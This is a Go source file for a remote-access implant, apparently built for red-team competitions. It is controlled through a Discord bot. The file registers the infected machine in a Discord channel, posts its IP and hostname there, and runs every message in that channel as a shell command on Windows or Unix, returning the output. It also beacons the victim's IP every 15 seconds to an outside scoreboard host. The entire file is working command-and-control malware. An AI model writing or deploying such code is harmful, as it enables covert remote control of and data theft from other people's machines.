package main

import (
	"context"
	"os"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"net/http"
	"bytes"
	"strings"
	"time"
	"encoding/json"
	"github.com/emmaunel/DiscordGo/discord"
	"github.com/andersfylling/disgord"
)

//------------------CONSTANTS---------------------
var botToken = "CHANGE-ME"
var id =  12// <-------- Server ID
var categoryName = "bsd"
var channelName = "bsd-team"

//------------------CONSTANTS---------------------


var categoryid disgord.Snowflake
var channelid disgord.Snowflake
var generalid disgord.Snowflake
var con = context.Background()
var channel *disgord.Channel = nil
var debug = true

// PwnBoard json post request 
type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func processError(err error){
	fmt.Println("Error: ", err)
}

func userInput(s disgord.Session, evt *disgord.MessageCreate){
	msg := evt.Message
	fmt.Println(msg.Content)
	fmt.Println(msg.ChannelID)

	if generalid == msg.ChannelID {
		fmt.Println("Am I general")
	}

	// If the channel ID is not the same as the message's Channel ID
	// Ignore it
	if (channelid != msg.ChannelID){
		return
	}
	if !evt.Message.Author.Bot{
		// Problem is it is sending/receive the command globally <-------------Think of a way
		if msg.Content == "ping" {
			msg.Reply(evt.Ctx, s, "I am alive. Thank you")
		}else if msg.Content == "die"{ 
			// Delete Channel
			s.DeleteChannel(con, msg.ChannelID)
			os.Exit(0)
		}else if msg.Content == "install" {
			//Install stuff based on OS <-------------TODO
		}else{
			//run os command and send results
			output := shellRun(msg.Content)
			if output == ""{
				s.SendMsg(con, channelid, "Command didn't return anything")
			}else{
				s.SendMsg(con, channelid, prettyOutput(output))
			}
		}
	}else{
		// Do nothing
		// fmt.Println("It is a bot")
	}
}

// shellRun runs commands based on OS
// CMD(for now) --> Windows
// SH --> Linux based machine, most of them have sh installed
//TODO: Deal with large output
func shellRun(cmd string) string{
	// special cd
	splittedCommand := strings.Fields(string(cmd))
	args := splittedCommand[1:]
	if splittedCommand[0] == "cd" {
		os.Chdir(strings.Join(args, ""))
		return "Changed directory Successfully"
	}

	var shell, flag string
	if runtime.GOOS == "windows"{
		shell = "cmd"
		flag = "/c"
	} else{
		shell = "/bin/sh"
		flag = "-c"
	}

	out, err := exec.Command(shell, flag, cmd).Output()
	if err != nil {
		return "Invalid command"
	}

	return string(out)
}

// updatepwnBoard sends a post request to pwnboard with the IP
// Request is done every 15 seconds
// ip: Victim's IP
func updatepwnBoard(ip string){
	for {
		time.Sleep(15 * time.Second)

		url := "http://pwnboard.win/generic"

     	// Create the struct
     	data := PwnBoard{
        	IPs:  ip,
        	Type: "sexyPotat0",
     	}

    	// Marshal the data
    	sendit, err := json.Marshal(data)
    	if err != nil {
        	return
    	}

    	// Send the post to pwnboard
    	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
    	if err != nil {
        	return
    	}

		defer resp.Body.Close()
	}
}

// getIP gets the victim's IP
func getIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// PrettyOutput beautifies output by putting ``` in first and back of the string
// out: Output message
func prettyOutput(out string) string {
	return "```" + out + "```"
}

// Entry Point
func main(){

	client := disgord.New(disgord.Config{
		BotToken: botToken,
	})

	// Pwnboard updates
	// Remove this if it doesn't apply to you
	go updatepwnBoard(getIP()) // <-----------------------Pwnboard stuff

	defer client.StayConnectedUntilInterrupted(con)

	guild, _ := client.GetGuild(con, disgord.Snowflake(id))

	// list of channels
	channels, _ := client.GetGuildChannels(con, guild.ID)

	//create catogory
	category := discord.CreateCategory(client, id, channels, categoryName)
	categoryid = category.ID

	//general channel
	// gen := discord.CreateChannel(channels, client, id,  category, "general") //<--------------------TODO
	// generalid = gen.ID
	// fmt.Println("Gen ", generalid)

	//create channel
	channel = discord.CreateChannel(channels, client, id,  category, channelName)
	channelid = channel.ID

	// sending system info
	hostname , _ := os.Hostname()
	systeminfo := ""
	systeminfo += "IP: " + getIP() + "\n"
	systeminfo += "Hostname: " + hostname + "\n"
	systeminfo += "OS: " + categoryName + "\n"

	systeminfomsg, _ := client.SendMsg(con, channel.ID, prettyOutput(systeminfo))
	client.PinMessage(con, systeminfomsg)

	client.On(disgord.EvtMessageCreate, userInput)
}
